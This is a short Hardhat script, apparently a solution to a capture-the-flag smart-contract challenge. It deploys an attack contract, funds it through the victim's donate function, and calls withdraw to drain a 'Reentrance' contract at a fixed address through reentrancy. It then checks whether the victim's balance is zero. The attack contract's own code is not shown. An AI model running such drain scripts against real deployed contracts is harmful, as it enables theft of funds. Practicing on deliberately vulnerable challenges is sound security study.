import { ethers } from "hardhat";

const INSTANCE = "0x9c25aeb71bCE852a941a57Efbb9caE7bB6df6A7b";

async function main() {
  const HACK = await ethers.getContractFactory("HacKReentrancy");
  const hack = await HACK.deploy(INSTANCE);
  await hack.deployed();

  const victim = await ethers.getContractAt("Reentrance", INSTANCE);
  let tx = await victim.donate(hack.address, { value: "10000000000000000" });
  await tx.wait();

  tx = await hack.withdraw();
  await tx.wait();

  const balance = await ethers.provider.getBalance(victim.address);
  if (balance.toNumber() > 0) {
    console.log("Attack contract failed");
  } else {
    console.log("Successfully attack the contract");
  }
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
